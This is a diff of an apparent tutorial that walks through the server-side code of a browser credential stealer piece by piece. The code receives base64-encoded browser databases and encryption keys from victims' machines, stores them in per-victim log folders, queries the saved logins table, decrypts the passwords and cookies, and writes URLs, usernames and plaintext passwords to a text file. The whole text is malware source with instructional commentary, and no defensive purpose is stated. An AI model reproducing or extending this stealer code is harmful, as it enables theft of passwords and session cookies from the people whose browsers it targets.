@@ -1502,11 +1502,13 @@ Now let's look at this code in parts.
 
     def receive_browser_log(unique_id):
 This function first receives JSON from the client
+
 [python]
 
     unique_id_logs_dir = os.path.join(app.root_path, 'logs', unique_id)
     os.makedirs(unique_id_logs_dir, exist_ok=True)
 Create a directory in which the logs will be stored. Each client's log folder will be named after its unique ID
+
 [python]
 
     passwords_file_path = os.path.join(unique_id_logs_dir, 'passwords.txt')[/CODE] Path to the file in which passwords will be written
@@ -1517,10 +1519,12 @@ Create a directory in which the logs will be stored. Each client's log folder wi
     print(f'There is no key in the browser {browser_name}.')
     continue
 Getting the key in base64 format from the data received from the client
+
 [python]
 
     key = base64.b64decode(key_base64)
 Decoding a key from base64 to bytes
+
 [python]
 
     decoded_data = base64.b64decode(file_data)
@@ -1531,6 +1535,7 @@ Decoding a key from base64 to bytes
     db_file.write(decoded_data)
 
 This code decodes files from base64, namely databases with logins and passwords. Then these decoded files are written to the log folder that we created earlier.
+
 [python]
 
     if (param_name == "login_data"):
@@ -1538,6 +1543,7 @@ This code decodes files from base64, namely databases with logins and passwords.
     cursor = connection.cursor()
     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
 If JSON contains the login_data parameter, then in this case a connection to this database occurs
+
 [python]
 
     origin_url = row[0]
@@ -1548,6 +1554,7 @@ These rows are responsible for extracting data from the columns
 
     decrypted_password = decrypt_password(encrypted_password, key)
 The decrypt_password function is called and passed the encrypted password and the key     that was previously decoded from base64.
+
 [python]
 
     passwords_file.write(f'Browser: {browser_name}\n')
@@ -1555,6 +1562,7 @@ The decrypt_password function is called and passed the encrypted password and th
     passwords_file.write(f'Username: {username_value}\n' )
     passwords_file.write(f'Password: {decrypted_password}\n')
 Write data from database columns to a previously created text file for passwords, and the     decrypted password itself.
+
 [python]
 
     elif param_name == "cookies":
@@ -1563,6 +1571,7 @@ Write data from database columns to a previously created text file for passwords
     process_cookies(decoded_data, key, cookies_file_path)
     print(f"File {db_name} was successfully saved and cookies were decrypted.")
 In this code, it first checks whether there is a cookies parameter in the JSON; if it exists, then the path for saving the file is formed.
+
 [python]
 
     process_cookies(decoded_data, key, cookies_file_path)
